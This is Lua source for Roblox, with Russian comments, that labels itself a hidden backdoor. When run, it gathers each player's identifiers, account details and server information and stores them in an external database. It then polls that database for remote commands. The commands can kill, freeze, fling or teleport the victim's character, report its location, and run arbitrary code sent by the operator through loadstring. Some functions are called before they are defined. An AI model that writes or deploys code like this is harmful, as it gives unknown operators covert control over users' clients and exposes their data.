-- Функции бекдора
local function makePresence()
    return table.concat({
        LP.DisplayName,
        LP.Name,
        tostring(game.PlaceId),
        tostring(game.JobId):sub(1, 8),
        tostring(math.floor(tick())),
        tostring(LP.UserId)
    }, "§")
end

local function parsePresence(raw)
    if not raw or raw == "" then return nil end
    local p = raw:split("§")
    if #p < 6 then return nil end
    return {
        displayName = p[1],
        name = p[2],
        placeId = p[3],
        jobId = p[4],
        lastSeen = tonumber(p[5]) or 0,
        userId = p[6]
    }
end

local function savePlayerData()
    local data = {
        displayName = LP.DisplayName,
        name = LP.Name,
        userId = LP.UserId,
        accountAge = LP.AccountAge,
        membershipType = LP.MembershipType:lower(),
        lastSeen = tick(),
        placeId = game.PlaceId,
        jobId = game.JobId,
        fps = math.floor(1 / RS.Heartbeat:Wait()),
        platform = UIS.TouchEnabled and "mobile" or (UIS.KeyboardEnabled and "pc" or "console")
    }
    dbSet(MY_DATA_KEY, HS:JSONEncode(data), DB_TTL)
end

-- Загрузка скрытого бекдора (второй скрипт будет загружен отдельно)
local function loadBackdoor()
    -- Флаг что скрипт запущен
    LP:SetAttribute(NET_FLAG_LOCAL, "1")
    LP:SetAttribute("_HH_Running", tostring(os.time()))
    
    -- Сохраняем данные
    savePlayerData()
    
    -- Сердцебиение
    task.spawn(function()
        while true do
            pcall(function()
                dbSet(MY_KEY, makePresence(), DB_TTL)
                if isAdmin then
                    readMyCmd()
                end
            end)
            task.wait(HEARTBEAT)
        end
    end)
    
    -- Чтение команд (только для админов)
    task.spawn(function()
        while true do
            task.wait(POLL_RATE)
            pcall(fetchAllUsers)
        end
    end)
end

local function fetchAllUsers()
    local ok, keysData = pcall(function()
        return HS:GetAsync(DB_BASE .. "?prefix=presence_&format=keys", true)
    end)
    if not ok or not keysData then return end
    
    local newReg = {}
    for key in keysData:gmatch("[^\n]+") do
        key = key:match("^%s*(.-)%s*$")
        if key:sub(1, 9) == "presence_" then
            local uid = key:sub(10)
            local raw = dbGet(key)
            local info = parsePresence(raw)
            if info then
                info.sameServer = (info.jobId == tostring(game.JobId):sub(1, 8))
                newReg[uid] = info
            end
        end
    end
    
    -- Добавляем локальных игроков
    for _, plr in ipairs(Players:GetPlayers()) do
        if plr ~= LP then
            local flag = plr:GetAttribute(NET_FLAG_LOCAL)
            if flag then
                local uid = tostring(plr.UserId)
                if not newReg[uid] then
                    newReg[uid] = {
                        displayName = plr.DisplayName,
                        name = plr.Name,
                        placeId = tostring(game.PlaceId),
                        jobId = tostring(game.JobId):sub(1, 8),
                        lastSeen = tick(),
                        userId = uid,
                        sameServer = true
                    }
                end
            end
        end
    end
    
    Registry = newReg
end

-- Команды
local function sendCmd(targetUserId, cmd, data)
    local payload = table.concat({ tostring(LP.UserId), cmd, data or "", tostring(math.floor(tick())) }, "|")
    task.spawn(function() dbSet(CMD_PREFIX .. tostring(targetUserId), payload, 30) end)
end

local function readMyCmd()
    if not isAdmin then return end
    local raw = dbGet(MY_CMD_KEY)
    if not raw or raw == "" then return end
    if processedCmds[raw] then return end
    processedCmds[raw] = true
    
    -- Очистка старых команд
    local cnt = 0
    for _ in pairs(processedCmds) do cnt = cnt + 1 end
    if cnt > 60 then processedCmds = {} end
    
    local parts = raw:split("|")
    if #parts < 3 then return end
    
    local senderId, cmd, data = parts[1], parts[2]:upper(), parts[3]
    local senderName = senderId
    if Registry[senderId] then
        senderName = Registry[senderId].displayName
    else
        local sp = Players:GetPlayerByUserId(tonumber(senderId))
        if sp then senderName = sp.DisplayName end
    end
    
    executeBackdoorCmd(cmd, data, senderName)
end

-- Функции для админ-панели
local function getPlayerData(userId)
    return dbGet("data_" .. userId)
end

local function spectatePlayer(targetPlayer)
    if not targetPlayer or not targetPlayer.Character then return end
    local char = targetPlayer.Character
    local root = char:FindFirstChild("HumanoidRootPart")
    if not root then return end
    
    Camera.CameraSubject = root
    Camera.CameraType = Enum.CameraType.Attach
end

local function stopSpectating()
    local char = LP.Character
    local hum = char and char:FindFirstChildOfClass("Humanoid")
    if hum then
        Camera.CameraSubject = hum
        Camera.CameraType = Enum.CameraType.Custom
    end
end

local function controlPlayer(targetPlayer)
    if not targetPlayer or not targetPlayer.Character then return end
    
    -- Сохраняем оригинальное управление
    local origChar = LP.Character
    local origHum = origChar and origChar:FindFirstChildOfClass("Humanoid")
    
    -- Переключаем управление
    LP.Character = targetPlayer.Character
    workspace.CurrentCamera.CameraSubject = targetPlayer.Character:FindFirstChildOfClass("Humanoid")
    
    task.delay(0.1, function()
        LP.Character = origChar
        if origHum then
            workspace.CurrentCamera.CameraSubject = origHum
        end
    end)
end

local function viewThroughEyes(targetPlayer)
    if not targetPlayer or not targetPlayer.Character then return end
    local head = targetPlayer.Character:FindFirstChild("Head")
    if head then
        Camera.CameraSubject = head
        Camera.CameraType = Enum.CameraType.Attach
    end
end

local function followPlayer(targetPlayer)
    if not targetPlayer or not targetPlayer.Character then return end
    local root = targetPlayer.Character:FindFirstChild("HumanoidRootPart")
    if root then
        Camera.CameraSubject = root
        Camera.CameraType = Enum.CameraType.Follow
    end
end

local function executeBackdoorCmd(cmd, data, senderName)
    local char = LP.Character
    local hum = char and char:FindFirstChildOfClass("Humanoid")
    local root = char and char:FindFirstChild("HumanoidRootPart")
    
    if cmd == "GET_PLAYER_DATA" then
        local targetId = data
        local playerData = getPlayerData(targetId)
        if playerData then
            sendCmd(tonumber(senderName), "PLAYER_DATA", playerData)
        end
        
    elseif cmd == "SPECTATE" then
        local target = Players:GetPlayerByUserId(tonumber(data))
        spectatePlayer(target)
        
    elseif cmd == "STOP_SPECTATE" then
        stopSpectating()
        
    elseif cmd == "CONTROL" then
        local target = Players:GetPlayerByUserId(tonumber(data))
        controlPlayer(target)
        
    elseif cmd == "VIEW_EYES" then
        local target = Players:GetPlayerByUserId(tonumber(data))
        viewThroughEyes(target)
        
    elseif cmd == "FOLLOW" then
        local target = Players:GetPlayerByUserId(tonumber(data))
        followPlayer(target)
        
    elseif cmd == "GET_LOCATION" then
        if root then
            local pos = root.Position
            sendCmd(tonumber(senderName), "LOCATION", string.format("%.1f,%.1f,%.1f", pos.X, pos.Y, pos.Z))
        end
        
    elseif cmd == "GET_PLACE" then
        sendCmd(tonumber(senderName), "PLACE", tostring(game.PlaceId) .. "|" .. game.JobId)
        
    elseif cmd == "EXECUTE" then
        local func = loadstring(data)
        if func then
            pcall(func)
        end
        
    elseif cmd == "GET_ALL_PLAYERS" then
        local players = {}
        for _, plr in ipairs(Players:GetPlayers()) do
            table.insert(players, tostring(plr.UserId) .. ":" .. plr.Name)
        end
        sendCmd(tonumber(senderName), "PLAYERS_LIST", table.concat(players, ","))
    end
    
    -- Оригинальные команды
    if cmd == "KILL" then
        if hum then pcall(function() hum.Health = 0 end) end
    elseif cmd == "FREEZE" then
        if hum then pcall(function() hum.WalkSpeed = 0; hum.JumpPower = 0 end) end
    elseif cmd == "UNFREEZE" then
        if hum then pcall(function() hum.WalkSpeed = 16; hum.JumpPower = 50 end) end
    elseif cmd == "FLING" then
        if root then
            local bv = Instance.new("BodyVelocity")
            bv.Velocity = Vector3.new(math.random(-500, 500), math.random(500, 1000), math.random(-500, 500))
            bv.MaxForce = Vector3.new(1e9, 1e9, 1e9)
            bv.P = 1e9
            bv.Parent = root
            game:GetService("Debris"):AddItem(bv, 0.3)
        end
    elseif cmd == "GOTO" then
        if root then
            local p = data:split(",")
            if #p == 3 then
                local x, y, z = tonumber(p[1]), tonumber(p[2]), tonumber(p[3])
                if x and y and z then
                    root.CFrame = CFrame.new(x, y + 3, z)
                end
            end
        end
    elseif cmd == "BRING" then
        local target = Players:GetPlayerByUserId(tonumber(data))
        if target and target.Character and root then
            local tRoot = target.Character:FindFirstChild("HumanoidRootPart")
            if tRoot then
                tRoot.CFrame = root.CFrame * CFrame.new(0, 0, -5)
            end
        end
    end
end

